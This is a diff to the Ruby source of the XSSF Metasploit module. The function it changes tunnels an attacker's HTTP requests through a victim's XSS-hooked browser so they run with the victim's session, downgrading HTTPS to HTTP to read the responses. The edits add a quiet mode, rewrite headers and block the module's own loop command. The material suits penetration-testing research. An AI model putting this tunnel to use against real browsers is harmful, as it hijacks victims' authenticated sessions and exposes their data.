@@ -11,7 +11,7 @@ module Msf
 			# /!\ XSSF server isn't a proxy, so as a server, it can't manage only HTTP protocol and not HTTPs one (and HTTPs server would be useless as browser won't 
 			# work with HTTPs proxy server. Anyway, a real proxy could be implemented, but problem is that existing Ruby proxy don't manage certificates, 
 			# so the SSL request content won't be available...
-			# The only solition - for now - is to call HTTPs websites with HTTP protocol : https://www.google.fr => http://www.google.fr
+			# The only solition - for now - is to call HTTPs websites with HTTP protocol: https://www.google.fr => http://www.google.fr
 			# That way, request can be readable and transformed to JavaScript
 			#
 			def xssf_tunnel_request(req, res, victim)
@@ -24,13 +24,13 @@ module Msf
 
 				sop = ((uri1.scheme == uri2.scheme) and (uri1.host == uri2.host) and (uri1.port == uri2.port))
 
-				# Checking SOP (Same-Origin Policy) constraints : in case SOP is checked and valid, request can be done on victim side, and victim can access the resource with valid session
+				# Checking SOP (Same-Origin Policy) constraints: in case SOP is checked and valid, request can be done on victim side, and victim can access the resource with valid session
 				if ( sop or ((victim.location =~ /^https:/im) and (uri1.host == uri2.host)) or (victim.location =~ /^data:/im) or (victim.location =~ /^file:/im) )	
 					id = nil;	timeout_request = TUNNEL_TIMEOUT	# Keeping TUNNEL_TIMEOUT secs to execute on client side and have response
 
 					TUNNEL_LOCKED.synchronize {						# One thread at time
-						id = add_request_in_tunnel(uri1.query ? uri1.path.to_s + "?" + CGI::unescape(uri1.query.to_s) : uri1.path.to_s, req.request_method.upcase, body)
-						print_status("ADDING '#{req.request_method.upcase}' REQUEST IN TUNNEL FOR  '#{uri1.query ? uri1.path.to_s + "?" + CGI::unescape(uri1.query.to_s) : uri1.path.to_s}' (#{id.to_s})")
+						id = add_request_in_tunnel(uri1.query ? uri1.path.to_s + "?" + uri1.query.to_s : uri1.path.to_s, req.request_method.upcase, body)
+						print_status("ADDING '#{req.request_method.upcase}' REQUEST IN TUNNEL FOR  '#{uri1.query ? uri1.path.to_s + "?" + CGI::unescape(uri1.query.to_s) : uri1.path.to_s}' (#{id.to_s})") if not XSSF_QUIET_MODE[0]
 					}
 
 					begin
@@ -45,23 +45,26 @@ module Msf
 							Base64.decode64(TUNNEL[id][2]).each_line  do |l|
 								(l =~ /([^:]*):(.*)\n/) ? headers[$1.chomp] = ($2.chomp).gsub(/https:\/\//i, 'http://') : ((l =~ /===(\d*)===/) ? status = $1.chomp.to_i : (message = $1.chomp.to_s if (l =~ /==(.*)==/)))
 							end	
-
-							XSSF_RESP(res, URI.unescape(Base64.decode64(TUNNEL[id][1])).gsub(/https:\/\//i, 'http://'), status, message, {"Content-Type" 		=> headers['Content-Type'],
-																																		  "Connection" 			=> headers['Connection'],
-																																		  "Content-Length" 		=> headers['Content-Length'],
-																																		  "Content-Location" 	=> headers['Content-Location'],
-																																		  "Content-Disposition"	=> headers['Content-Disposition'],
-																																		  "Location" 			=> headers['Location'],
-																																		  "Set-Cookie" 			=> headers['Set-Cookie'],
-																																		  "Server" 				=> headers['Server'],
-																																		  "WWW-Authenticate" 	=> headers['WWW-Authenticate']
-																																		  })
+							
+							code = URI.unescape(Base64.decode64(TUNNEL[id][1])).gsub(/https:\/\//i, 'http://')
+							code = code.gsub(/\/loop/i, '/lOop')		# Attacker does not want to be attacked
+							
+							XSSF_RESP(res, code, status, message, { "Content-Type" 			=> headers['Content-Type'],
+																	"Connection" 			=> headers['Connection'],
+																	"Content-Length" 		=> headers['Content-Length'],
+																	"Content-Location" 		=> headers['Content-Location'] ? headers['Content-Location'].gsub(/https:\/\//i, 'http://') : nil,
+																	"Content-Disposition"	=> headers['Content-Disposition'],
+																	"Location" 				=> headers['Location'] ? headers['Location'].gsub(/https:\/\//i, 'http://') : nil,
+																	"Set-Cookie" 			=> headers['Set-Cookie'],
+																	"Server" 				=> headers['Server'],
+																	"WWW-Authenticate" 		=> headers['WWW-Authenticate']
+																	})
 						else
 							XSSF_404(res)
 						end
 					rescue
-						print_error("ERROR IN TUNNEL : #{$!}")
-						XSSF_RESP(res, "<html><body> NO RESPONSE FROM VICTIM <br/> Maybe you are not visiting same domain than victim : #{uri2.scheme}://#{uri2.host}:#{uri2.port} !</body></html>")
+						print_error("ERROR IN TUNNEL: #{$!}")
+						XSSF_RESP(res, "<html><body> NO RESPONSE FROM VICTIM <br/> Maybe you are not visiting same domain than victim: #{uri2.scheme}://#{uri2.host}:#{uri2.port} !</body></html>")
 					end
 						
 					TUNNEL_LOCKED.synchronize { TUNNEL.delete(id) }
